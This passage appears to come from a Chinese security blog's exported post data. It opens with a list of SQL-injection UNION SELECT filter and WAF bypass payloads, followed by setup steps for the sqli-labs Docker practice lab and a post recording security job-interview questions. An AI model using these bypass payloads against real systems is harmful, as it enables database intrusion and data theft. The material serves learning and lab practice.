href=\"#2-26-union-select绕过\" class=\"headerlink\" title=\"2.26 union select绕过\"></a>2.26 union select绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sel<span class=\"operator\">&lt;&gt;</span>ect # 程序过滤<span class=\"operator\">&lt;&gt;</span>为空 脚本处理</span><br><span class=\"line\">sele<span class=\"comment\">/**/</span>ct # 程序过滤<span class=\"comment\">/**/</span>为空</span><br><span class=\"line\"><span class=\"comment\">/*!%53eLEct*/</span> # url 编码与内联注释</span><br><span class=\"line\">se<span class=\"operator\">%</span><span class=\"number\">0</span>blect # 使用空格绕过</span><br><span class=\"line\">sele<span class=\"operator\">%</span>ct # 使用百分号绕过</span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">53</span>eLEct # 编码绕过</span><br><span class=\"line\"><span class=\"keyword\">uNIoN</span> <span class=\"keyword\">sELecT</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">all</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">DISTINCT</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">null</span><span class=\"operator\">+</span><span class=\"keyword\">UNION</span><span class=\"operator\">+</span><span class=\"keyword\">SELECT</span><span class=\"operator\">+</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span><span class=\"comment\">/**/</span><span class=\"keyword\">select</span><span class=\"comment\">/**/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">and</span>(<span class=\"keyword\">select</span> <span class=\"number\">1</span>)<span class=\"operator\">=</span>(<span class=\"keyword\">Select</span> <span class=\"number\">0xA</span><span class=\"operator\">*</span><span class=\"number\">1000</span>)<span class=\"comment\">/*!uNIOn*/</span><span class=\"comment\">/*!SeLECt*/</span> <span class=\"number\">1</span>,<span class=\"keyword\">user</span>()</span><br><span class=\"line\"><span class=\"comment\">/*!50000union*/</span><span class=\"comment\">/*!50000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">/*!40000union*/</span><span class=\"comment\">/*!40000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>aunion<span class=\"operator\">%</span><span class=\"number\">0</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">250</span>aunion<span class=\"operator\">%</span><span class=\"number\">250</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">09</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">09</span><span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>caunion<span class=\"operator\">%</span><span class=\"number\">0</span>cselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>daunion<span class=\"operator\">%</span><span class=\"number\">0</span>dselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>baunion<span class=\"operator\">%</span><span class=\"number\">0</span>bselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>d<span class=\"operator\">%</span><span class=\"number\">0</span>aunion<span class=\"operator\">%</span><span class=\"number\">0</span>d<span class=\"operator\">%</span><span class=\"number\">0</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2</span></span><br><span class=\"line\"><span class=\"comment\">/*!12345union*/</span><span class=\"comment\">/*!12345select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/*中文*/</span><span class=\"keyword\">union</span><span class=\"comment\">/*中文*/</span><span class=\"keyword\">select</span><span class=\"comment\">/*中文*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/* */</span><span class=\"keyword\">union</span><span class=\"comment\">/* */</span><span class=\"keyword\">select</span><span class=\"operator\">/</span> <span class=\"operator\">*</span><span class=\"operator\">/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!00000all*/</span><span class=\"comment\">/*!00000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"3-sqli-labs通关\"><a href=\"#3-sqli-labs通关\" class=\"headerlink\" title=\"3. sqli-labs通关\"></a>3. sqli-labs通关</h2><h3 id=\"3-1-准备工作\"><a href=\"#3-1-准备工作\" class=\"headerlink\" title=\"3.1 准备工作\"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull acgpiano/sqli-labs</span><br><span class=\"line\">docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></table></figure>\n\n<p>中间可能报错，只需要关闭代理就行。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error response from daemon: Head <span class=\"string\">&quot;https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest&quot;</span>: Get <span class=\"string\">&quot;https://auth.docker.io/token?account=squarehhh&amp;scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&amp;service=registry.docker.io&quot;</span>: EOF</span><br></pre></td></tr></table></figure>\n\n<p>访问网页，环境搭建完毕。</p>\n<img src=\"/posts/31899/image-20250305014536324.png\" class=\"\" title=\"image-20250305014536324\">\n\n<p>查看相关版本细节。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker <span class=\"built_in\">exec</span> -it sqli-labs /bin/bash</span><br><span class=\"line\">$ mysql -e <span class=\"string\">&quot;select version(),user()&quot;</span></span><br><span class=\"line\">+-------------------------+----------------+</span><br><span class=\"line\">| version()               | user()         |</span><br><span class=\"line\">+-------------------------+----------------+</span><br><span class=\"line\">| 5.5.44-0ubuntu0.14.04.1 | root@localhost |</span><br><span class=\"line\">+-------------------------+----------------+</span><br><span class=\"line\">$ php --version</span><br><span class=\"line\">PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)</span><br><span class=\"line\">Copyright (c) 1997-2014 The PHP Group</span><br><span class=\"line\">Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies</span><br><span class=\"line\">    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> /etc/init.d/ &amp;&amp; apache2 -v</span><br><span class=\"line\">Server version: Apache/2.4.7 (Ubuntu)</span><br><span class=\"line\">Server built:   Oct 14 2015 14:20:21</span><br></pre></td></tr></table></figure>\n\n"},{"title":"找工作之旅","hide":false,"abbrlink":13584,"date":"2025-03-03T15:26:55.000Z","_content":"\n## 2024-3-27\n\n### 长亭一面\n\n- 自我介绍\n- 了解常见的漏洞吗\n  - SQL注入啊，SSRF啊什么什么的讲了一通\n- SQL注入无回显的情况下怎么利用呢\n  - 讲了下盲注\n- 了解twos的一些漏洞吗\n  - 没听清，我一直读的唉唉艾斯（IIS）\n- 那你了解weblogic的一些漏洞吗\n  - 说了反序列化\n- 你做过web项目开发，讲讲\n  - 说了用springboot开发\n- 那你知道springboot的一些漏洞吗\n  - 说了个Framework反序列化漏洞，还有个Actuator泄露\n- Actuator泄露能展开讲讲吗\n  - 大概讲了下泄露了什么，怎么利用\n- 了解Java相关漏洞吗\n  - 说了shiro反序列化漏洞，说了下原理\n- 会追CC链吗\n  - 讲了CC3和一个CB链\n- 了解内存马吗\n  - 大致讲了下原理\n- 反问\n  - 公司做什么（大致就是有师傅带着进行一些攻防，渗透测试）\n  - twos是什么（面试官讲了以后才知道就是IIS）\n\n长亭的效率是真的快，半小时就发二面通知了\n\n## 2023-3-29\n\n### 长亭二面\n\n- 自我介绍\n- 什么时间开始接触信息安全\n- 通过什么途径学习\n- 参加过哪些比赛，比较有名的\n- cert成员主要做什么\n- 测试对象\n- sql注入类型\n  - 盲注，堆叠啥的讲了一通\n- 特殊的注入\n  - 二次注入，宽字节注入\n- 你sql注入的一般流程\n  - 找注入点，fuzz过滤什么什么的。。。\n- 会用工具协助吗\n  - sqlmap\n- 浏览器输入域名到浏览器有一个回显，说一下这个过程是怎么实现的\n  - 按理解讲了一下，不知道对不对\n- sqlmap怎么对cookie进行注入\n  - 不会。。\n- 用过msf吗\n  - 讲了下对生成木马做源码级免杀，讲了一下原理\n- xss攻击原理\n  - 讲了一通\n- 怎么防御\n  - 黑白名单，输出编码，httponly\n- tcp三次握手\n- 大概意思是学习到哪了，只会web吗？\n  - 讲了下内网渗透\n- 性格咋样\n- 对网络安全的兴趣\n- 每天花多少学习网络安全\n- 护网了解吗\n- 网络安全其他分支进行过学习吗\n- 挖过src吗\n- 实战挖到过漏洞吗，讲下渗透测试经历\n  - 讲了一下博彩网站渗透\n- 印象深刻的一次ctf比赛\n  - 讲了一下天枢的一个题\n- 希望通过实习获得哪方面的提升\n- 反问\n  - 评价\n  - 工作模式和氛围\n- 后面紧接着就是hr面\n\n## 2024-4-2\n\n长亭oc\n\n## 2024-11-19\n\n### 腾讯一面\n\nlc4t学长的部门\n\n- 自我介绍\n- 介绍渗透测试思路\n- 指纹识别框架包含什么\n  - 关注哪些细节\n  - 识别工具原理\n- 常见备份文件或敏感目录以及用来做什么\n  - 自己的小技巧\n- 其他信息收集需要关注的信息和资产\n- 详细介绍蜜罐做的哪部分环节和工作\n  - 要关注到哪几个方面？\n  - 进入一台机器后怎么判断是不是蜜罐\n- 防火墙设计\n- 护网蓝队主要工作\n- sql注入原理（越深越好，越底层越好）\n  - 防御手段\n  - 直接用预编译可以杜绝sql注入吗？\n- XSS和SQL注入相同点\n  - 挖掘XSS时候的测试思路\n  - 如果用的vue和react的框架，如何挖掘XSS\n  - 发现XSS以后，利用思路是什么\n  - 反射型XSS利用时怎么不让别人发现\n  - 写自己的JS的时候，有没有遇到防护手段，怎么绕过？\n  - HTTP与同源策略的限制\n- 信息收集以后要干什么\n- 碰到什么样的漏洞要具体关注一下\n- 利用漏洞最终是想达成什么条件\n- 内网横向的一般步骤\n- 找到域控之类的怎么拿的\n  - 没找到咋办\n- 除了渗透测试之外的安全方向\n- WAF发展的模式分哪几种\n- WAF和AI是否有结合的空间？要怎么处理呢\n  - 选择具体的算法和深度学习模型你选哪个\n- 前沿一些的领域有了解吗\n- 怎么获取这些咨询的\n- 编程功底怎么样\n  - 有参加过开源项目吗\n  - 列三个最常用的Python库\n  - Python3.7、3.6、3.8有什么区别\n  - 出现多版本冲突怎么解决\n- dockerfile会写吗\n  - 用docker解决什么问题\n  - 对有容器的系统来说，在安全上有什么额外的关注点\n- 算法和数据结构有印象吗\n- 计网和计组呢\n  - L3、L4、L7区别是什么\n  - DNS协议和TCP/IP协议区别是啥？有什么联系\n  - 手机点开微信到能加载消息加载成功，经过的网络协议有哪些\n  - ARM和x86有啥区别\n  - 现代计算机的设计理念\n- 用过AI工具吗？ChatGPT基本原理\n  - 类似LLM和NLP的区别和联系\n- 怎么拆解leader或者导师安排的任务\n  - 如果因为沟通延迟等原因，无法交付怎么和leader沟通\n- 反问\n\n被狠狠地拷打了，问题都问的比较深，真真切切体现出我的学习情况，对于漏洞都没有深挖，导致稍微问深一点就答不上了。还有就是面试能力太差，经常出现大脑一片空白。这次面试也是给了我一个警醒。\n","source":"_posts/找工作之旅.md","raw":"---\ntitle: 找工作之旅\ntags:\n  - 网络安全\nhide: false\nabbrlink: 13584\ndate: 2025-03-03 23:26:55\n---\n\n## 2024-3-27\n\n### 长亭一面\n\n- 自我介绍\n- 了解常见的漏洞吗\n  - SQL注入啊，SSRF啊什么什么的讲了一通\n- SQL注入无回显的情况下怎么利用呢\n  - 讲了下盲注\n- 了解twos的一些漏洞吗\n  - 没听清，我一直读的唉唉艾斯（IIS）\n- 那你了解weblogic的一些漏洞吗\n  - 说了反序列化\n- 你做过web项目开发，讲讲\n  - 说了用springboot开发\n- 那你知道springboot的一些漏洞吗\n  - 说了个Framework反序列化漏洞，还有个Actuator泄露\n- Actuator泄露能展开讲讲吗\n  - 大概讲了下泄露了什么，怎么利用\n- 了解Java相关漏洞吗\n  - 说了shiro反序列化漏洞，说了下原理\n- 会追CC链吗\n  - 讲了CC3和一个CB链\n- 了解内存马吗\n  - 大致讲了下原理\n- 反问\n  - 公司做什么（大致就是有师傅带着进行一些攻防，渗透测试）\n  - twos是什么（面试官讲了以后才知道就是IIS）\n\n长亭的效率是真的快，半小时就发二面通知了\n\n## 2023-3-29\n\n### 长亭二面\n\n- 自我介绍\n- 什么时间开始接触信息安全\n- 通过什么途径学习\n- 参加过哪些比赛，比较有名的\n- cert成员主要做什么\n- 测试对象\n- sql注入类型\n  - 盲注，堆叠啥的讲了一通\n- 特殊的注入\n  - 二次注入，宽字节注入\n- 你sql注入的一般流程\n  - 找注入点，fuzz过滤什么什么的。。。\n- 会用工具协助吗\n  - sqlmap\n- 浏览器输入域名到浏览器有一个回显，说一下这个过程是怎么实现的\n  - 按理解讲了一下，不知道对不对\n- sqlmap怎么对cookie进行注入\n  - 不会。。\n- 用过msf吗\n  - 讲了下对生成木马做源码级免杀，讲了一下原理\n- xss攻击原理\n  - 讲了一通\n- 怎么防御\n  - 黑白名单，输出编码，httponly\n- tcp三次握手\n- 大概意思是学习到哪了，只会web吗？\n  - 讲了下内网渗透\n- 性格咋样\n- 对网络安全的兴趣\n- 每天花多少学习网络安全\n- 护网了解吗\n- 网络安全其他分支进行过学习吗\n- 挖过src吗\n- 实战挖到过漏洞吗，讲下渗透测试经历\n  - 讲了一下博彩网站渗透\n- 印象深刻的一次ctf比赛\n  - 讲了一下天枢的一个题\n- 希望通过实习获得哪方面的提升\n- 反问\n  - 评价\n  - 工作模式和氛围\n- 后面紧接着就是hr面\n\n## 2024-4-2\n\n长亭oc\n\n## 2024-11-19\n\n### 腾讯一面\n\nlc4t学长的部门\n\n- 自我介绍\n- 介绍渗透测试思路\n- 指纹识别框架包含什么\n  - 关注哪些细节\n  - 识别工具原理\n- 常见备份文件或敏感目录以及用来做什么\n  - 自己的小技巧\n- 其他信息收集需要关注的信息和资产\n- 详细介绍蜜罐做的哪部分环节和工作\n  - 要关注到哪几个方面？\n  - 进入一台机器后怎么判断是不是蜜罐\n- 防火墙设计\n- 护网蓝队主要工作\n- sql注入原理（越深越好，越底层越好）\n  - 防御手段\n  - 直接用预编译可以杜绝sql注入吗？\n- XSS和SQL注入相同点\n  - 挖掘XSS时候的测试思路\n  - 如果用的vue和react的框架，如何挖掘XSS\n  - 发现XSS以后，利用思路是什么\n  - 反射型XSS利用时怎么不让别人发现\n  - 写自己的JS的时候，有没有遇到防护手段，怎么绕过？\n  - HTTP与同源策略的限制\n- 信息收集以后要干什么\n- 碰到什么样的漏洞要具体关注一下\n- 利用漏洞最终是想达成什么条件\n- 内网横向的一般步骤\n- 找到域控之类的怎么拿的\n  - 没找到咋办\n- 除了渗透测试之外的安全方向\n- WAF发展的模式分哪几种\n- WAF和AI是否有结合的空间？要怎么处理呢\n  - 选择具体的算法和深度学习模型你选哪个\n- 前沿一些的领域有了解吗\n- 怎么获取这些咨询的\n- 编程功底怎么样\n  - 有参加过开源项目吗\n  - 列三个最常用的Python库\n  - Python3.7、3.6、3.8有什么区别\n  - 出现多版本冲突怎么解决\n- dockerfile会写吗\n  - 用docker解决什么问题\n  - 对有容器的系统来说，在安全上有什么额外的关注点\n- 算法和数据结构有印象吗\n- 计网和计组呢\n  - L3、L4、L7区别是什么\n  - DNS协议和TCP/IP协议区别是啥？有什么联系\n  - 手机点开微信到能加载消息加载成功，经过的网络协议有哪些\n  - ARM和x86有啥区别\n  - 现代计算机的设计理念\n- 用过AI工具吗？ChatGPT基本原理\n  - 类似LLM和NLP的区别和联系\n- 怎么拆解leader或者导师安排的任务\n  - 如果因为沟通延迟等原因，无法交付怎么和leader沟通\n- 反问\n\n被狠狠地拷打了，问题都问的比较深，真真切切体现出我的学习情况，对于漏洞都没有深挖，导致稍微问深一点就答不上了。还有就是面试能力太差，经常出现大脑一片空白。这次面试也是给了我一个警醒。\n","slug":"找工作之旅","published":1,"updated":"2025-03-04T14:36:47.271Z","comments":1,"layout":"post","photos":[],"_id":"cm7ussaxp0003asjf6ttp7t5c","content":"<h2 id=\"2024-3-27\"><a href=\"#2024-3-27\" class=\"headerlink\" title=\"2024-3-27\"></a>2024-3-27</h2><h3 id=\"长亭一面\"><a href=\"#长亭一面\" class=\"headerlink\" title=\"长亭一面\"></a>长亭一面</h3><ul>\n<li>自我介绍</li>\n<li>了解常见的漏洞吗<ul>\n<li>SQL注入啊，SSRF啊什么什么的讲了一通</li>\n</ul>\n</li>\n<li>SQL注入无回显的情况下怎么利用呢<ul>\n<li>讲了下盲注</li>\n</ul>\n</li>\n<li>了解twos的一些漏洞吗<ul>\n<li>没听清，我一直读的唉唉艾斯（IIS）</li>\n</ul>\n</li>\n<li>那你了解weblogic的一些漏洞吗<ul>\n<li>说了反序列化</li>\n</ul>\n</li>\n<li>你做过web项目开发，讲讲<ul>\n<li>说了用springboot开发</li>\n</ul>\n</li>\n<li>那你知道springboot的一些漏洞吗<ul>\n<li>说了个Framework反序列化漏洞，还有个Actuator泄露</li>\n</ul>\n</li>\n<li>Actuator泄露能展开讲讲吗<ul>\n<li>大概讲了下泄露了什么，怎么利用</li>\n</ul>\n</li>\n<li>了解Java相关漏洞吗<ul>\n<li>说了shiro反序列化漏洞，说了下原理</li>\n</ul>\n</li>\n<li>会追CC链吗<ul>\n<li>讲了CC3和一个CB链</li>\n</ul>\n</li>\n<li>了解内存马吗<ul>\n<li>大致讲了下原理</li>\n</ul>\n</li>\n<li>反问<ul>\n<li>公司做什么（大致就是有师傅带着进行一些攻防，渗透测试）</li>\n<li>twos是什么（面试官讲了以后才知道就是IIS）</li>\n</ul>\n</li>\n</ul>\n<p>长亭的效率是真的快，半小时就发二面通知了</p>\n<h2 id=\"2023-3-29\"><a href=\"#2023-3-29\" class=\"headerlink\" title=\"2023-3-29\"></a>2023-3-29</h2><h3 id=\"长亭二面\"><a href=\"#长亭二面\" class=\"headerlink\" title=\"长亭二面\"></a>长亭二面</h3><ul>\n<li>自我介绍</li>\n<li>什么时间开始接触信息安全</li>\n<li>通过什么途径学习</li>\n<li>参加过哪些比赛，比较有名的</li>\n<li>cert成员主要做什么</li>\n<li>测试对象</li>\n<li>sql注入类型<ul>\n<li>盲注，堆叠啥的讲了一通</li>\n</ul>\n</li>\n<li>特殊的注入<ul>\n<li>二次注入，宽字节注入</li>\n</ul>\n</li>\n<li>你sql注入的一般流程<ul>\n<li>找注入点，fuzz过滤什么什么的。。。</li>\n</ul>\n</li>\n<li>会用工具协助吗<ul>\n<li>sqlmap</li>\n</ul>\n</li>\n<li>浏览器输入域名到浏览器有一个回显，说一下这个过程是怎么实现的<ul>\n<li>按理解讲了一下，不知道对不对</li>\n</ul>\n</li>\n<li>sqlmap怎么对cookie进行注入<ul>\n<li>不会。。</li>\n</ul>\n</li>\n<li>用过msf吗<ul>\n<li>讲了下对生成木马做源码级免杀，讲了一下原理</li>\n</ul>\n</li>\n<li>xss攻击原理<ul>\n<li>讲了一通</li>\n</ul>\n</li>\n<li>怎么防御<ul>\n<li>黑白名单，输出编码，httponly</li>\n</ul>\n</li>\n<li>tcp三次握手</li>\n<li>大概意思是学习到哪了，只会web吗？<ul>\n<li>讲了下内网渗透</li>\n</ul>\n</li>\n<li>性格咋样</li>\n<li>对网络安全的兴趣</li>\n<li>每天花多少学习网络安全</li>\n<li>护网了解吗</li>\n<li>网络安全其他分支进行过学习吗</li>\n<li>挖过src吗</li>\n<li>实战挖到过漏洞吗，讲下渗透测试经历<ul>\n<li>讲了一下博彩网站渗透</li>\n</ul>\n</li>\n<li>印象深刻的一次ctf比赛<ul>\n<li>讲了一下天枢的一个题</li>\n</ul>\n</li>\n<li>希望通过实习获得哪方面的提升</li>\n<li>反问<ul>\n<li>评价</li>\n<li>工作模式和氛围</li>\n</ul>\n</li>\n<li>后面紧接着就是hr面</li>\n</ul>\n<h2 id=\"2024-4-2\"><a href=\"#2024-4-2\" class=\"headerlink\" title=\"2024-4-2\"></a>2024-4-2</h2><p>长亭oc</p>\n<h2 id=\"2024-11-19\"><a href=\"#2024-11-19\" class=\"headerlink\" title=\"2024-11-19\"></a>2024-11-19</h2><h3 id=\"腾讯一面\"><a href=\"#腾讯一面\" class=\"headerlink\" title=\"腾讯一面\"></a>腾讯一面</h3><p>lc4t学长的部门</p>\n<ul>\n<li>自我介绍</li>\n<li>介绍渗透测试思路</li>\n<li>指纹识别框架包含什么<ul>\n<li>关注哪些细节</li>\n<li>识别工具原理</li>\n</ul>\n</li>\n<li>常见备份文件或敏感目录以及用来做什么<ul>\n<li>自己的小技巧</li>\n</ul>\n</li>\n<li>其他信息收集需要关注的信息和资产</li>\n<li>详细介绍蜜罐做的哪部分环节和工作<ul>\n<li>要关注到哪几个方面？</li>\n<li>进入一台机器后怎么判断是不是蜜罐</li>\n</ul>\n</li>\n<li>防火墙设计</li>\n<li>护网蓝队主要工作</li>\n<li>sql注入原理（越深越好，越底层越好）<ul>\n<li>防御手段</li>\n<li>直接用预编译可以杜绝sql注入吗？</li>\n</ul>\n</li>\n<li>XSS和SQL注入相同点<ul>\n<li>挖掘XSS时候的测试思路</li>\n<li>如果用的vue和react的框架，如何挖掘XSS</li>\n<li>发现XSS以后，利用思路是什么</li>\n<li>反射型XSS利用时怎么不让别人发现</li>\n<li>写自己的JS的时候，有没有遇到防护手段，怎么绕过？</li>\n<li>HTTP与同源策略的限制</li>\n</ul>\n</li>\n<li>信息收集以后要干什么</li>\n<li>碰到什么样的漏洞要具体关注一下</li>\n<li>利用漏洞最终是想达成什么条件</li>\n<li>内网横向的一般步骤</li>\n<li>找到域控之类的怎么拿的<ul>\n<li>没找到咋办</li>\n</ul>\n</li>\n<li>除了渗透测试之外的安全方向</li>\n<li>WAF发展的模式分哪几种</li>\n<li>WAF和AI是否有结合的空间？要怎么处理呢<ul>\n<li>选择具体的算法和深度学习模型你选哪个</li>\n</ul>\n</li>\n<li>前沿一些的领域有了解吗</li>\n<li>怎么获取这些咨询的</li>\n<li>编程功底怎么样<ul>\n<li>有参加过开源项目吗</li>\n<li>列三个最常用的Python库</li>\n<li>Python3.7、3.6、3.8有什么区别</li>\n<li>出现多版本冲突怎么解决</li>\n</ul>\n</li>\n<li>dockerfile会写吗<ul>\n<li>用docker解决什么问题</li>\n<li>对有容器的系统来说，在安全上有什么额外的关注点</li>\n</ul>\n</li>\n<li>算法和数据结构有印象吗</li>\n<li>计网和计组呢<ul>\n<li>L3、L4、L7区别是什么</li>\n<li>DNS协议和TCP/IP协议区别是啥？有什么联系</li>\n<li>手机点开微信到能加载消息加载成功，经过的网络协议有哪些</li>\n<li>ARM和x86有啥区别</li>\n<li>现代计算机的设计理念</li>\n</ul>\n</li>\n<li>用过AI工具吗？ChatGPT基本原理<ul>\n<li>类似LLM和NLP的区别和联系</li>\n</ul>\n</li>\n<li>怎么拆解leader或者导师安排的任务<ul>\n<li>如果因为沟通延迟等原因，无法交付怎么和leader沟通</li>\n</ul>\n</li>\n<li>反问</li>\n</ul>\n<p>被狠狠地拷打了，问题都问的比较深，真真切切体现出我的学习情况，对于漏洞都没有深挖，导致稍微问深一点就答不上了。还有就是面试能力太差，经常出现大脑一片空白。这次面试也是给了我一个警醒。</p>\n","length":1659,"excerpt":"","more":"<h2 id=\"2024-3-27\"><a href=\"#2024-3-27\" class=\"headerlink\" title=\"2024-3-27\"></a>2024-3-27</h2><h3 id=\"长亭一面\"><a href=\"#长亭一面\" class=\"headerlink\" title=\"长亭一面\"></a>长亭一面</h3><ul>\n<li>自我介绍</li>\n<li>了解常见的漏洞吗<ul>\n<li>SQL注入啊，SSRF啊什么什么的讲了一通</li>\n</ul>\n</li>\n<li>SQL注入无回显的情况下怎么利用呢<ul>\n<li>讲了下盲注</li>\n</ul>\n</li>\n<li>了解twos的一些漏洞吗<ul>\n<li>没听清，我一直读的唉唉艾斯（IIS）</li>\n</ul>\n</li>\n<li>那你了解weblogic的一些漏洞吗<ul>\n<li>说了反序列化</li>\n</ul>\n</li>\n<li>你做过web项目开发，讲讲<ul>\n<li>说了用springboot开发</li>\n</ul>\n</li>\n<li>那你知道springboot的一些漏洞吗<ul>\n<li>说了个Framework反序列化漏洞，还有个Actuator泄露</li>\n</ul>\n</li>\n<li>Actuator泄露能展开讲讲吗<ul>\n<li>大概讲了下泄露了什么，怎么利用</li>\n</ul>\n</li>\n<li>了解Java相关漏洞吗<ul>\n<li>说了shiro反序列化漏洞，说了下原理</li>\n</ul>\n</li>\n<li>会追CC链吗<ul>\n<li>讲了CC3和一个CB链</li>\n</ul>\n</li>\n<li>了解内存马吗<ul>\n<li>大致讲了下原理</li>\n</ul>\n</li>\n<li>反问<ul>\n<li>公司做什么（大致就是有师傅带着进行一些攻防，渗透测试）</li>\n<li>twos是什么（面试官讲了以后才知道就是IIS）</li>\n</ul>\n</li>\n</ul>\n<p>长亭的效率是真的快，半小时就发二面通知了</p>\n<h2 id=\"2023-3-29\"><a href=\"#2023-3-29\" class=\"headerlink\" title=\"2023-3-29\"></a>2023-3-29</h2><h3 id=\"长亭二面\"><a href=\"#长亭二面\" class=\"headerlink\" title=\"长亭二面\"></a>长亭二面</h3><ul>\n<li>自我介绍</li>\n<li>什么时间开始接触信息安全</li>\n<li>通过什么途径学习</li>\n<li>参加过哪些比赛，比较有名的</li>\n<li>cert成员主要做什么</li>\n<li>测试对象</li>\n<li>sql注入类型<ul>\n<li>盲注，堆叠啥的讲了一通</li>\n</ul>\n</li>\n<li>特殊的注入<ul>\n<li>二次注入，宽字节注入</li>\n</ul>\n</li>\n<li>你sql注入的一般流程<ul>\n<li>找注入点，fuzz过滤什么什么的。。。</li>\n</ul>\n</li>\n<li>会用工具协助吗<ul>\n<li>sqlmap</li>\n</ul>\n</li>\n<li>浏览器输入域名到浏览器有一个回显，说一下这个过程是怎么实现的<ul>\n<li>按理解讲了一下，不知道对不对</li>\n</ul>\n</li>\n<li>sqlmap怎么对cookie进行注入<ul>\n<li>不会。。</li>\n</ul>\n</li>\n<li>用过msf吗<ul>\n<li>讲了下对生成木马做源码级免杀，讲了一下原理</li>\n</ul>\n</li>\n<li>xss攻击原理<ul>\n<li>讲了一通</li>\n</ul>\n</li>\n<li>怎么防御<ul>\n<li>黑白名单，输出编码，httponly</li>\n</ul>\n</li>\n<li>tcp三次握手</li>\n<li>大概意思是学习到哪了，只会web吗？<ul>\n<li>讲了下内网渗透</li>\n</ul>\n</li>\n<li>性格咋样</li>\n<li>对网络安全的兴趣</li>\n<li>每天花多少学习网络安全</li>\n<li>护网了解吗</li>\n<li>网络安全其他分支进行过学习吗</li>\n<li>挖过src吗</li>\n<li>实战挖到过漏洞吗，讲下渗透测试经历<ul>\n<li>讲了一下博彩网站渗透</li>\n</ul>\n</li>\n<li>印象深刻的一次ctf比赛<ul>\n<li>讲了一下天枢的一个题</li>\n</ul>\n</li>\n<li>希望通过实习获得哪方面的提升</li>\n<li>反问<ul>\n<li>评价</li>\n<li>工作模式和氛围</li>\n</ul>\n</li>\n<li>后面紧接着就是hr面</li>\n</ul>\n<h2 id=\"2024-4-2\"><a href=\"#2024-4-2\" class=\"headerlink\" 